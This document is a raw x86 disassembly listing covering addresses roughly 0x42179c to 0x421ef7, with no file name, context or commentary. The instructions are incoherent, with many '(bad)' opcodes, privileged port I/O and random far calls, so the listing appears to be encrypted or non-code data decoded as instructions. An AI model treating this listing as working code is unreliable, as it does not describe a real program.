  42179c:	jnp    0x4217bd
  42179e:	pop    edx
  42179f:	jge    0x42172f
  4217a1:	stos   BYTE PTR es:[edi],al
  4217a2:	xor    al,0x88
  4217a4:	rcr    BYTE PTR [eax+0x52],0x7f
  4217a8:	cmp    al,0x36
  4217aa:	jecxz  0x4217be
  4217ac:	jns    0x421795
  4217ae:	adc    DWORD PTR [ebx+0x58aa7f36],ebp
  4217b4:	into   
  4217b5:	push   cs
  4217b6:	lock in al,dx
  4217b8:	imul   edi,DWORD PTR [eax+ebp*2],0x2e
  4217bc:	mov    edi,0xbe68c6ed
  4217c1:	fild   DWORD PTR [ecx]
  4217c3:	xor    al,0x61
  4217c5:	outs   dx,DWORD PTR ds:[esi]
  4217c6:	addr16 jmp 0x400e:0xa129a18b
  4217ce:	xchg   ecx,eax
  4217cf:	test   eax,0xf256e454
  4217d4:	adc    eax,0xbb4df78d
  4217d9:	sbb    DWORD PTR [ebx+0x3e],edx
  4217dc:	jl     0x4217e5
  4217de:	cld    
  4217df:	dec    ebp
  4217e0:	and    al,0xb2
  4217e2:	push   ds
  4217e3:	stos   BYTE PTR es:[edi],al
  4217e4:	addr16 aaa 
  4217e6:	or     dh,0x8b
  4217e9:	lahf   
  4217ea:	jecxz  0x4217d4
  4217ec:	(bad)  
  4217ee:	fs retf 
  4217f0:	pop    edi
  4217f1:	push   esi
  4217f2:	mov    bl,0x2c
  4217f4:	imul   DWORD PTR [eax+0x12]
  4217f7:	lahf   
  4217f8:	inc    edi
  4217f9:	repz mov WORD PTR [esi-0x34bc33ba],es
  421800:	ins    DWORD PTR es:[edi],dx
  421801:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421802:	(bad)  
  421803:	cmc    
  421804:	leave  
  421805:	adc    BYTE PTR [eax-0x1b],dl
  421808:	mov    esp,0xf50a262e
  42180d:	sar    BYTE PTR [esi+0x3b],0x78
  421811:	fwait
  421812:	sbb    eax,0xa2fbd2cc
  421817:	inc    edi
  421818:	cdq    
  421819:	iret   
  42181a:	hlt    
  42181b:	ins    DWORD PTR es:[edi],dx
  42181c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42181d:	cmc    
  42181e:	mov    ah,0x17
  421820:	cmp    al,0x87
  421822:	sub    al,0x5c
  421824:	inc    ecx
  421825:	pop    eax
  421826:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421827:	sti    
  421828:	outs   dx,BYTE PTR ds:[esi]
  421829:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42182a:	out    dx,al
  42182b:	push   0xffffff9c
  42182d:	mov    esi,DWORD PTR [edi]
  42182f:	jb     0x421837
  421831:	push   esi
  421832:	sub    al,0x5d
  421834:	imul   DWORD PTR [esi-0x7d62bc6b]
  42183a:	pop    ecx
  42183b:	aaa    
  42183c:	int    0x4
  42183e:	sub    esp,eax
  421840:	jno    0x421875
  421842:	push   ds
  421843:	outs   dx,DWORD PTR ds:[esi]
  421844:	sbb    al,0x95
  421846:	fdivr  QWORD PTR [ebx+esi*1-0x6a]
  42184a:	ror    BYTE PTR [ecx],1
  42184c:	nop
  42184d:	addr16 in al,0x8a
  421850:	pop    esp
  421851:	inc    edx
  421852:	push   cs
  421853:	popf   
  421854:	add    BYTE PTR [edi-0x65],ch
  421857:	add    esi,DWORD PTR [edi]
  421859:	sub    al,0xb2
  42185b:	fsub   DWORD PTR [ebx]
  42185d:	push   edx
  42185e:	retf   
  42185f:	push   es
  421860:	add    BYTE PTR [edi-0x3e],bl
  421863:	pop    ebp
  421864:	les    ebp,FWORD PTR [ebp+edx*1-0x2946530e]
  42186b:	(bad)  
  42186c:	ja     0x4218a4
  42186e:	dec    esp
  42186f:	ss mov edi,0x494fa69c
  421875:	mov    eax,ds:0xed743740
  42187a:	sub    al,0xb3
  42187c:	(bad)  
  42187d:	fsubr  st,st(4)
  42187f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421880:	pop    ss
  421881:	pop    esp
  421882:	pop    esi
  421883:	sub    DWORD PTR [esi+edx*4-0x75daefed],0x50
  42188b:	add    ecx,0x77
  42188e:	mov    esp,0xc6860e5f
  421893:	out    0x85,eax
  421895:	push   ebp
  421896:	arpl   WORD PTR [ebx],ax
  421898:	ds leave 
  42189a:	stc    
  42189b:	jle    0x4218e0
  42189d:	lods   eax,DWORD PTR ds:[esi]
  42189e:	adc    ebx,DWORD PTR [edx+0x3c]
  4218a1:	cli    
  4218a2:	push   0xda84386b
  4218a7:	ins    DWORD PTR es:[edi],dx
  4218a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218a9:	cli    
  4218aa:	mov    al,ds:0x65c8d701
  4218af:	pop    ds
  4218b0:	add    eax,DWORD PTR [edi-0x56]
  4218b3:	inc    esi
  4218b4:	jo     0x42187a
  4218b6:	jle    0x421879
  4218b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218b9:	jnp    0x4218a4
  4218bb:	retf   
  4218bc:	js     0x4218f7
  4218be:	(bad)  
  4218c0:	je     0x42190a
  4218c2:	gs mov ecx,esp
  4218c5:	iret   
  4218c6:	bound  edi,QWORD PTR [ebx+0x3fefc5d8]
  4218cc:	shr    DWORD PTR [edx+0xd],1
  4218cf:	inc    edi
  4218d0:	add    DWORD PTR [ebx-0x44],edx
  4218d3:	xchg   edi,eax
  4218d4:	push   edi
  4218d5:	jns    0x421880
  4218d7:	mov    DWORD PTR [esi-0x20297f59],ecx
  4218dd:	mov    edx,0xbe998fd2
  4218e2:	ss push cs
  4218e4:	out    dx,eax
  4218e5:	leave  
  4218e6:	fisttp QWORD PTR [esi]
  4218e8:	ret    
  4218e9:	sub    dh,al
  4218eb:	mov    bh,0x17
  4218ed:	lods   al,BYTE PTR ds:[esi]
  4218ee:	and    eax,0xd38c7102
  4218f3:	dec    esi
  4218f4:	mov    esi,0x4311e101
  4218f9:	ret    
  4218fa:	(bad)  
  4218fb:	loopne 0x4218c2
  4218fd:	(bad)  
  4218fe:	fcom   DWORD PTR [esi+0x330e713]
  421904:	inc    esi
  421905:	add    eax,DWORD PTR [ebx]
  421907:	or     ebp,DWORD PTR [esi+edx*1]
  42190a:	(bad)  
  42190c:	call   0x30ab:0x2dd5421c
  421913:	cmovp  edi,ecx
  421916:	inc    esp
  421917:	adc    eax,0x9cd6d471
  42191c:	lds    edi,FWORD PTR [esi+0x3d]
  42191f:	pop    edi
  421920:	das    
  421921:	dec    esp
  421922:	out    dx,eax
  421923:	adc    cl,BYTE PTR [edi]
  421925:	retf   0x8428
  421928:	jns    0x4218b7
  42192a:	stos   DWORD PTR es:[edi],eax
  42192b:	inc    ebx
  42192c:	mov    al,0x6b
  42192e:	and    BYTE PTR [ebx],al
  421930:	inc    esi
  421931:	hlt    
  421932:	xor    al,0x16
  421934:	sub    al,0x69
  421936:	cld    
  421937:	enter  0xdd72,0xf0
  42193b:	sub    bl,BYTE PTR [ecx]
  42193d:	nop
  42193e:	lods   al,BYTE PTR ds:[esi]
  42193f:	retf   0x194
  421942:	ret    0x3a4e
  421945:	shl    DWORD PTR [ebx],1
  421947:	adc    eax,0xfa5ee479
  42194c:	xor    DWORD PTR [esi+0x4a],ebx
  42194f:	call   0xc682:0x4e9083f8
  421956:	leave  
  421957:	sar    eax,1
  421959:	test   al,0xbe
  42195b:	retf   
  42195c:	cmp    edi,DWORD PTR [ebx-0x31]
  42195f:	ret    0x7109
  421962:	(bad)  
  421963:	(bad)  
  421964:	ss in  eax,0xd7
  421967:	inc    ecx
  421968:	sahf   
  421969:	mov    ds:0xbb5d7bc,eax
  42196e:	imul   esi,DWORD PTR [eax],0x84838166
  421974:	aad    0x64
  421976:	inc    esi
  421977:	psubusb mm4,QWORD PTR [ecx]
  42197a:	adc    BYTE PTR [ebp+0x51],bl
  42197d:	mov    dl,dl
  42197f:	bound  esp,QWORD PTR ds:0x487f6325
  421985:	sbb    al,0x1d
  421987:	arpl   WORD PTR [esi+edi*8+0x2],bp
  42198b:	jnp    0x421937
  42198d:	scas   al,BYTE PTR es:[edi]
  42198e:	mov    ebx,0xc1451ace
  421993:	and    edx,esi
  421995:	stos   DWORD PTR es:[edi],eax
  421996:	or     dl,BYTE PTR [edi-0x46689870]
  42199c:	pop    ecx
  42199d:	xor    ah,BYTE PTR ds:0x9a7e7b0f
  4219a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4219a4:	(bad)  
  4219a5:	out    dx,al
  4219a6:	daa    
  4219a7:	adc    esi,DWORD PTR [ebx-0x330d0c8b]
  4219ad:	aaa    
  4219ae:	lds    edx,FWORD PTR [ebx-0x58]
  4219b1:	pop    edx
  4219b2:	xchg   ebx,eax
  4219b3:	cmc    
  4219b4:	mov    cs,WORD PTR [esi]
  4219b6:	add    BYTE PTR [edx+0x5a],dl
  4219b9:	aaa    
  4219ba:	dec    esi
  4219bb:	stos   DWORD PTR es:[edi],eax
  4219bc:	add    BYTE PTR [ecx-0x12],bl
  4219bf:	push   0x2b
  4219c1:	xor    DWORD PTR [edi],esp
  4219c3:	scas   al,BYTE PTR es:[edi]
  4219c4:	xchg   ecx,eax
  4219c5:	stos   DWORD PTR es:[edi],eax
  4219c6:	ror    edx,cl
  4219c8:	push   edx
  4219c9:	lods   al,BYTE PTR ds:[esi]
  4219ca:	xchg   esp,eax
  4219cb:	pop    ecx
  4219cc:	imul   ebp,DWORD PTR [eax+0x10],0xffffffbb
  4219d0:	cs out dx,eax
  4219d2:	add    esi,DWORD PTR [ebx+esi*8-0x17]
  4219d6:	inc    edx
  4219d7:	adc    bl,BYTE PTR [eax-0x1952e8dd]
  4219dd:	or     ch,ch
  4219df:	sub    edx,ecx
  4219e1:	int3   
  4219e2:	pop    ds
  4219e3:	pop    es
  4219e4:	or     ah,BYTE PTR [ebp-0xcce52af]
  4219ea:	fimul  DWORD PTR [esi+0x27]
  4219ed:	sub    al,0xa5
  4219ef:	sbb    DWORD PTR [ebx+ecx*8-0x73c0d951],ebp
  4219f6:	int3   
  4219f7:	ret    
  4219f8:	addr16 dec ecx
  4219fa:	pop    edx
  4219fb:	jecxz  0x42199b
  4219fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4219fe:	stos   DWORD PTR es:[edi],eax
  4219ff:	push   es
  421a00:	stos   BYTE PTR es:[edi],al
  421a01:	dec    ebp
  421a02:	(bad)  
  421a03:	in     al,0x37
  421a05:	test   DWORD PTR cs:[eax-0x45],ebx
  421a09:	mov    ecx,0x254a8b72
  421a0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a0f:	jne    0x4219ca
  421a11:	xchg   edx,eax
  421a12:	jno    0x421a4f
  421a14:	ret    
  421a15:	mov    esp,0xc082b1d0
  421a1a:	cld    
  421a1b:	ds loop 0x4219ca
  421a1e:	sti    
  421a1f:	subps  xmm3,XMMWORD PTR [eax]
  421a22:	xchg   esi,eax
  421a23:	push   cs
  421a24:	add    eax,0x4987fe11
  421a29:	(bad)  
  421a2a:	push   cs
  421a2b:	cmp    cl,BYTE PTR [edi]
  421a2d:	std    
  421a2e:	(bad)  
  421a30:	cmp    cl,BYTE PTR [edx]
  421a32:	jle    0x421a9b
  421a34:	(bad)  
  421a35:	dec    eax
  421a36:	aam    0x62
  421a38:	inc    ecx
  421a39:	ret    
  421a3a:	jge    0x421a0a
  421a3c:	shl    DWORD PTR [esi-0x36f7b7d1],1
  421a42:	sahf   
  421a43:	mov    ds:0xe4fc6d6d,al
  421a48:	ins    BYTE PTR es:[edi],dx
  421a49:	les    edi,FWORD PTR [edi+0x6562dcf6]
  421a4f:	sar    BYTE PTR [edi+0x7a],1
  421a52:	imul   eax,DWORD PTR [edi],0x7476a48c
  421a58:	pop    ecx
  421a59:	out    0x50,eax
  421a5b:	mov    esp,0x993e8e3f
  421a60:	xchg   esi,eax
  421a61:	mov    ?,esi
  421a63:	pop    edx
  421a64:	iret   
  421a65:	jl     0x421a4a
  421a67:	nop
  421a68:	sub    eax,0x8598deae
  421a6d:	shl    dl,cl
  421a6f:	pop    es
  421a70:	inc    eax
  421a71:	mov    al,0x7a
  421a73:	fsubp  st(6),st
  421a75:	adc    eax,0xe93fc2e5
  421a7a:	push   ss
  421a7b:	cdq    
  421a7c:	cdq    
  421a7d:	mov    esp,0xaa150631
  421a82:	mov    dh,BYTE PTR [ecx-0x39394bd5]
  421a88:	ret    
  421a89:	mov    ds:0xdec82d3f,eax
  421a8e:	or     BYTE PTR ds:[ecx+0x2d],cl
  421a92:	test   eax,0x81acc584
  421a97:	dec    edx
  421a98:	pop    esp
  421a99:	and    eax,0xe99bcfd4
  421a9e:	or     al,0x7c
  421aa0:	les    ebp,FWORD PTR [ebp-0x321641b3]
  421aa6:	pushf  
  421aa7:	scas   al,BYTE PTR es:[edi]
  421aa8:	mov    eax,0x133513f2
  421aad:	sti    
  421aae:	mov    bl,BYTE PTR [ebx-0x15]
  421ab1:	cdq    
  421ab2:	push   ebx
  421ab3:	call   0x3553:0x83d3906f
  421aba:	jmp    FWORD PTR [esi-0x6eea4a76]
  421ac0:	mov    ch,0xe7
  421ac2:	cmp    al,0x60
  421ac4:	xor    eax,0x1d777259
  421ac9:	jecxz  0x421ac4
  421acb:	or     ah,BYTE PTR [ebx+eax*1+0x73256ce1]
  421ad2:	adc    al,0x32
  421ad4:	jge    0x421a63
  421ad6:	adc    DWORD PTR [ebx+0x3f],0x782e5d10
  421add:	mov    WORD PTR [ebx-0x61],es
  421ae0:	loop   0x421ad6
  421ae2:	push   0xffffffe3
  421ae4:	retf   
  421ae5:	or     eax,0x5f145a06
  421aea:	jbe    0x421ab3
  421aec:	aaa    
  421aed:	add    DWORD PTR [esp+eax*8],ebx
  421af0:	sub    DWORD PTR [eax-0x6642f2c3],edx
  421af6:	sub    dh,BYTE PTR [ecx+eax*1]
  421af9:	pop    ebp
  421afa:	bound  esi,QWORD PTR [edi+0x46be1c86]
  421b00:	adc    eax,0x4ed09105
  421b05:	gs (bad) 
  421b07:	clc    
  421b08:	sbb    bh,BYTE PTR [esi]
  421b0a:	call   0xd74b29e0
  421b0f:	pop    ds
  421b10:	and    BYTE PTR [ebx],dl
  421b12:	add    bl,BYTE PTR [edx]
  421b14:	lods   al,BYTE PTR ds:[esi]
  421b15:	mov    cl,0xa9
  421b17:	shufps xmm1,XMMWORD PTR [esp-0x7a3486fb],0x91
  421b20:	sbb    al,0xb8
  421b22:	push   ecx
  421b23:	inc    ecx
  421b24:	std    
  421b25:	in     al,dx
  421b26:	in     al,0x77
  421b28:	xchg   DWORD PTR [edx+0x29],ecx
  421b2b:	pusha  
  421b2c:	xlat   BYTE PTR ds:[ebx]
  421b2d:	jmp    0x421b28
  421b2f:	xor    BYTE PTR [ecx+0x6c],ch
  421b32:	jmp    0x421b37
  421b34:	das    
  421b35:	add    eax,0xfa5c8b25
  421b3a:	mov    ebx,0x4ecc2df5
  421b3f:	xlat   BYTE PTR ds:[ebx]
  421b40:	push   eax
  421b41:	jno    0x421af2
  421b43:	sub    eax,0x5af5ac75
  421b48:	ret    
  421b49:	call   0x8d5b1616
  421b4e:	rol    BYTE PTR [edi+0x65ccf40d],1
  421b54:	mov    ebx,0xa20bcdf6
  421b59:	fcmove st,st(7)
  421b5b:	es sbb al,0xa8
  421b5e:	or     bh,bh
  421b60:	dec    esp
  421b61:	inc    eax
  421b62:	sub    BYTE PTR [ebp-0x31],0xb9
  421b66:	rep gs ins DWORD PTR es:[di],dx
  421b6a:	aad    0x65
  421b6c:	xchg   esp,eax
  421b6d:	adc    eax,DWORD PTR [edi-0x2d]
  421b70:	pop    ss
  421b71:	jmp    0x421b87
  421b73:	pop    es
  421b74:	pop    ecx
  421b75:	xlat   BYTE PTR ds:[ebx]
  421b76:	sti    
  421b77:	dec    esp
  421b78:	mov    edi,0x39de7f44
  421b7d:	xor    eax,0xef7b6112
  421b82:	sar    esi,0xd9
  421b85:	mov    ds:0x5cc3d807,eax
  421b8a:	cld    
  421b8b:	pop    edi
  421b8c:	jl     0x421b51
  421b8e:	mov    DWORD PTR [ebx],0x510a2c5e
  421b94:	ret    
  421b95:	out    dx,al
  421b96:	fwait
  421b97:	mov    esi,0x95b78df9
  421b9c:	xor    DWORD PTR [ecx+eax*4+0x7a],0xffffffc8
  421ba1:	ja     0x421ba8
  421ba3:	out    dx,eax
  421ba4:	inc    ecx
  421ba5:	rcr    BYTE PTR [eax-0x14dd3c81],cl
  421bab:	lods   eax,DWORD PTR ds:[esi]
  421bac:	es (bad) 
  421baf:	add    esi,esp
  421bb1:	pusha  
  421bb2:	adc    eax,0xc320e481
  421bb7:	fiadd  WORD PTR [ecx+0x4a]
  421bba:	ins    BYTE PTR es:[edi],dx
  421bbb:	dec    edx
  421bbc:	cmp    eax,0x2ed5444c
  421bc1:	aam    0xb4
  421bc3:	(bad)  [edi+edi*8-0x38e491e8]
  421bca:	outs   dx,DWORD PTR ds:[esi]
  421bcb:	pop    eax
  421bcc:	(bad)  
  421bcd:	arpl   WORD PTR [ecx],si
  421bcf:	jge    0x421c2b
  421bd1:	pop    ebp
  421bd2:	xor    BYTE PTR [edi-0x35a152be],ch
  421bd8:	repz xchg esi,eax
  421bda:	pop    ebp
  421bdb:	rsm    
  421bdd:	add    eax,0xacf39f6a
  421be2:	add    BYTE PTR [edx+0x2d21f53b],0x6f
  421be9:	js     0x421bfa
  421beb:	mov    esp,edx
  421bed:	or     esi,DWORD PTR [esi]
  421bef:	ret    
  421bf0:	lods   al,BYTE PTR ds:[esi]
  421bf1:	inc    edi
  421bf2:	pop    ebp
  421bf3:	icebp  
  421bf4:	stos   DWORD PTR es:[edi],eax
  421bf5:	(bad)  
  421bf6:	lods   al,BYTE PTR ds:[esi]
  421bf7:	xchg   DWORD PTR [esp+ebx*8+0x46bf134c],edi
  421bfe:	mov    eax,ds:0x758b8a93
  421c03:	pop    ebx
  421c04:	jb     0x421c1b
  421c06:	xchg   esp,eax
  421c07:	xchg   ebp,eax
  421c08:	push   ecx
  421c09:	rcl    BYTE PTR [esi],0x55
  421c0c:	jno    0x421c2b
  421c0e:	xchg   ebx,eax
  421c0f:	aam    0x55
  421c11:	and    al,0x32
  421c13:	jbe    0x421c79
  421c15:	int    0x1b
  421c17:	sub    BYTE PTR [esi],ch
  421c19:	dec    ebp
  421c1a:	pop    edi
  421c1b:	push   0xd769282b
  421c20:	pop    edx
  421c21:	jno    0x421c0f
  421c23:	cmp    cl,ch
  421c25:	outs   dx,DWORD PTR ds:[esi]
  421c26:	mov    dl,0x13
  421c28:	push   ecx
  421c29:	out    dx,eax
  421c2a:	add    ebx,edx
  421c2c:	dec    edx
  421c2d:	and    ebx,DWORD PTR ds:0x677274b
  421c33:	rol    DWORD PTR [edx+eax*8+0x6f2d2e46],0xbf
  421c3b:	test   ecx,eax
  421c3d:	call   0xe69d:0x3594315e
  421c44:	ret    0xb462
  421c47:	sahf   
  421c48:	outs   dx,BYTE PTR ds:[esi]
  421c49:	fsubr  DWORD PTR [eax-0x9]
  421c4c:	inc    ebx
  421c4d:	mov    ch,0xa6
  421c4f:	xlat   BYTE PTR ds:[ebx]
  421c50:	ret    
  421c51:	mov    ss,WORD PTR [ebx+0x3e]
  421c54:	or     dl,cl
  421c56:	mov    ah,0xe
  421c58:	mov    bl,0x6e
  421c5a:	fsub   QWORD PTR [edx+0x78]
  421c5d:	and    ebp,DWORD PTR [edx]
  421c5f:	cmp    al,0x48
  421c61:	aaa    
  421c62:	inc    edx
  421c63:	cmp    al,0xec
  421c65:	pop    edi
  421c67:	or     BYTE PTR [ebx+0x7b5b7d41],bh
  421c6d:	cld    
  421c6e:	xor    eax,edi
  421c70:	nop
  421c71:	sbb    BYTE PTR [eax+0x30b0df75],dh
  421c77:	push   ss
  421c78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c79:	dec    edi
  421c7a:	dec    edx
  421c7b:	sub    eax,0xf0e3f31b
  421c80:	imul   ebp,esi,0xffffffce
  421c83:	cwde   
  421c84:	outs   dx,DWORD PTR ds:[esi]
  421c85:	push   edx
  421c86:	add    DWORD PTR [ecx],0xffffffbc
  421c89:	xchg   DWORD PTR [eax+esi*2],esp
  421c8c:	adc    esi,edi
  421c8e:	xchg   BYTE PTR [eax],dl
  421c90:	lods   al,BYTE PTR ds:[esi]
  421c91:	retf   0x6abc
  421c94:	out    0x5b,eax
  421c96:	sbb    BYTE PTR [esi],0xa1
  421c99:	outs   dx,BYTE PTR ds:[esi]
  421c9a:	or     DWORD PTR [edx+0x50],edi
  421c9d:	mov    al,0xed
  421c9f:	add    al,ah
  421ca1:	iret   
  421ca2:	sbb    al,0xdb
  421ca4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ca5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ca6:	stos   BYTE PTR es:[edi],al
  421ca7:	push   esi
  421ca8:	xor    eax,0x5cdae2b5
  421cad:	jmp    0xa268b53e
  421cb2:	fnstcw WORD PTR ds:0x627389a9
  421cb8:	sbb    esi,DWORD PTR [ecx+0x65]
  421cbb:	sub    bh,ch
  421cbd:	xchg   esp,ebx
  421cbf:	cmc    
  421cc0:	pop    ds
  421cc1:	imul   eax,DWORD PTR [ebx+esi*2-0x53],0xd8f37833
  421cc9:	outs   dx,BYTE PTR ds:[esi]
  421cca:	mov    ah,0xd4
  421ccc:	sub    eax,0x345116b5
  421cd1:	mov    dl,0x59
  421cd3:	dec    ebp
  421cd4:	aaa    
  421cd5:	pushf  
  421cd6:	hlt    
  421cd7:	push   esi
  421cd8:	lock cmp al,0x72
  421cdb:	psrad  mm5,QWORD PTR ds:0xffe0ab3a
  421ce2:	mov    WORD PTR ss:[ebx+eax*1-0x1b],gs
  421ce7:	in     eax,0xb
  421ce9:	icebp  
  421cea:	not    BYTE PTR [ebp+esi*8-0x21efa046]
  421cf1:	mov    ecx,0xc799a75a
  421cf6:	push   ds
  421cf7:	js     0x421d69
  421cf9:	dec    ecx
  421cfa:	mov    ah,BYTE PTR [esp+eax*8]
  421cfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cfe:	pop    edx
  421cff:	xor    esi,DWORD PTR [ebx-0x258aba34]
  421d05:	jecxz  0x421d29
  421d07:	ss scas eax,DWORD PTR es:[edi]
  421d09:	pop    ds
  421d0a:	(bad)  
  421d0b:	xchg   ebx,eax
  421d0c:	jne    0x421c9f
  421d0e:	test   ch,ch
  421d10:	fwait
  421d11:	sbb    eax,0x32b82ee2
  421d16:	mov    ?,WORD PTR [edx+0x1]
  421d19:	cmp    eax,0x3cabf4f0
  421d1e:	and    ch,BYTE PTR [edx]
  421d20:	test   al,0x58
  421d22:	aaa    
  421d23:	(bad)  
  421d24:	rcl    DWORD PTR [ebx+0x66],cl
  421d27:	sub    BYTE PTR [ecx-0x1b463078],dh
  421d2d:	neg    DWORD PTR [eax+0x2390ed83]
  421d33:	test   al,0x5
  421d35:	(bad)  
  421d36:	sti    
  421d37:	test   al,0x43
  421d39:	aad    0x35
  421d3b:	sbb    edx,DWORD PTR [ebx-0x2f]
  421d3e:	(bad)
  421d41:	sub    al,0xfe
  421d43:	(bad)  
  421d44:	pop    eax
  421d45:	xchg   ebx,eax
  421d46:	scas   al,BYTE PTR es:[edi]
  421d47:	inc    edi
  421d48:	xor    DWORD PTR [ebp-0xc2b8f79],edx
  421d4e:	clc    
  421d4f:	xor    eax,0x8d9b97fb
  421d54:	nop    DWORD PTR [ecx+0x44a70103]
  421d5b:	dec    ebp
  421d5c:	popf   
  421d5d:	inc    edx
  421d5e:	mov    bl,0xc6
  421d60:	clc    
  421d61:	fwait
  421d62:	lds    esp,FWORD PTR [ebp-0x2d3978b8]
  421d68:	arpl   di,dx
  421d6a:	mov    al,0x55
  421d6c:	pop    bx
  421d6e:	xchg   edx,eax
  421d6f:	xchg   ebp,eax
  421d70:	div    eax
  421d72:	lock out 0x72,al
  421d75:	mov    eax,0xe17ec051
  421d7a:	sbb    esp,DWORD PTR [ebx+0x49]
  421d7d:	mov    ds,WORD PTR [edi]
  421d7f:	push   ecx
  421d80:	add    BYTE PTR [ecx],bl
  421d82:	add    eax,0x9d40d1b5
  421d87:	pop    esp
  421d88:	in     al,0xde
  421d8a:	adc    eax,0x628e2ae5
  421d8f:	jmp    0x421dd0
  421d91:	in     al,0x6f
  421d93:	mov    esi,DWORD PTR [ebp+0x3f]
  421d96:	call   0x8c7d:0x214704aa
  421d9d:	sbb    al,0x9c
  421d9f:	ins    DWORD PTR es:[edi],dx
  421da0:	inc    esi
  421da1:	or     edi,edx
  421da3:	(bad)  
  421da4:	fsub   DWORD PTR [edi]
  421da6:	add    esp,DWORD PTR [esp+eiz*4+0x2abb5ab]
  421dad:	push   ebx
  421dae:	and    al,0xc5
  421db0:	retf   0x4b81
  421db3:	add    bh,BYTE PTR [ebx-0x54255e3c]
  421db9:	ja     0x421d9c
  421dbb:	push   esp
  421dbc:	ds jle 0x421d9c
  421dbf:	ret    0xc310
  421dc2:	iret   
  421dc3:	mov    eax,DWORD PTR ds:0x9e497ff
  421dc9:	mov    eax,0xccbba1fb
  421dce:	aad    0xad
  421dd0:	xor    ah,0xef
  421dd3:	pop    eax
  421dd4:	sub    eax,ecx
  421dd6:	pop    es
  421dd7:	loop   0x421e17
  421dd9:	fild   QWORD PTR [ebp-0x37]
  421ddc:	jl     0x421df8
  421dde:	ret    
  421ddf:	retf   
  421de0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421de1:	fmul   st,st(3)
  421de3:	jnp    0x421e30
  421de5:	mov    eax,DWORD PTR [edx+0x21]
  421de8:	imul   edx,DWORD PTR [ebx+ebx*8-0x55],0x6b57dfe4
  421df0:	jb     0x421e70
  421df2:	pop    esi
  421df3:	sub    eax,ebx
  421df5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421df6:	cmc    
  421df7:	mov    BYTE PTR [ecx-0xf0b563],al
  421dfd:	test   DWORD PTR [eax],0x7951c8a
  421e03:	test   DWORD PTR [edx+ebx*1-0x459d35de],edx
  421e0a:	or     al,0x97
  421e0c:	sahf   
  421e0d:	push   es
  421e0e:	pop    ss
  421e0f:	lea    esp,[edx-0x75]
  421e12:	inc    edx
  421e13:	and    ebx,DWORD PTR [esi+0x20c0accf]
  421e19:	mov    edx,0xc4867174
  421e1e:	xor    al,0x8
  421e20:	das    
  421e21:	or     al,0x24
  421e23:	int3   
  421e24:	enter  0x24ea,0xfc
  421e28:	rol    BYTE PTR [eax-0x26],1
  421e2b:	mov    ds:0xa9939f4b,al
  421e30:	mov    ebx,0xb6aa63c0
  421e35:	loopne 0x421dd8
  421e37:	dec    esi
  421e38:	std    
  421e39:	in     al,dx
  421e3a:	imul   ebp,DWORD PTR [edi+0xa2dd9e0],0x50344ccd
  421e44:	dec    edx
  421e45:	push   ebx
  421e46:	cmp    al,0xa
  421e48:	in     al,0xb5
  421e4a:	or     ecx,DWORD PTR [esi+0x3de003fa]
  421e50:	icebp  
  421e51:	adc    eax,0x1229745f
  421e56:	jl     0x421ed0
  421e58:	and    al,0xb7
  421e5a:	push   ebp
  421e5b:	xchg   esp,eax
  421e5c:	test   al,0xfb
  421e5e:	sti    
  421e5f:	fstp   QWORD PTR [ebp-0x59]
  421e62:	adc    esi,DWORD PTR [ecx]
  421e64:	mov    ecx,0x7a7e2836
  421e69:	mov    al,ds:0xf3365e2c
  421e6e:	push   ss
  421e6f:	nop
  421e70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e71:	dec    eax
  421e72:	lods   eax,DWORD PTR ds:[esi]
  421e73:	cdq    
  421e74:	popa   
  421e75:	dec    edx
  421e76:	sbb    DWORD PTR [edi],ebx
  421e78:	or     BYTE PTR [ebx-0x5304cff],dh
  421e7e:	fistp  QWORD PTR [ebp-0x40084664]
  421e84:	dec    ecx
  421e85:	ins    BYTE PTR es:[edi],dx
  421e86:	in     eax,dx
  421e87:	xchg   ebp,eax
  421e88:	dec    ebx
  421e89:	ret    0xf340
  421e8c:	jae    0x421ea9
  421e8e:	xchg   edi,eax
  421e8f:	lahf   
  421e90:	arpl   WORD PTR [esi+0x73],si
  421e93:	int    0x9e
  421e95:	dec    esp
  421e96:	push   esi
  421e97:	push   0xdad0b20d
  421e9c:	xor    al,0x95
  421e9e:	stc    
  421e9f:	mov    ch,0x34
  421ea1:	adc    ch,BYTE PTR [edi+ebp*1+0x485643c1]
  421ea8:	int    0x92
  421eaa:	or     ecx,DWORD PTR [edx]
  421eac:	int    0xdd
  421eae:	mov    cl,0x22
  421eb0:	and    eax,0x8fb8f5cd
  421eb5:	imul   ebp,DWORD PTR [esi+0x47],0x4cb47e78
  421ebc:	ret    0x196c
  421ebf:	dec    ecx
  421ec0:	shr    DWORD PTR [esi],1
  421ec2:	pop    esi
  421ec3:	fisub  WORD PTR [ebp-0x4ae05705]
  421ec9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421eca:	cwde   
  421ecb:	in     al,dx
  421ecc:	(bad)  [ecx+0x5f]
  421ecf:	xor    ebp,DWORD PTR [eax+0x2af10da4]
  421ed5:	jo     0x421e6b
  421ed7:	mov    ds:0xb8aaabf6,al
  421edc:	sti    
  421edd:	retf   0xc0ff
  421ee0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ee1:	lock inc eax
  421ee3:	push   esi
  421ee4:	into   
  421ee5:	and    BYTE PTR [edi*2+0x45075ead],ch
  421eec:	xor    al,0xab
  421eee:	addr16 inc ebp
  421ef0:	inc    ebp
  421ef1:	call   0x88481a7a
  421ef6:	xchg   edi,eax
  421ef7:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
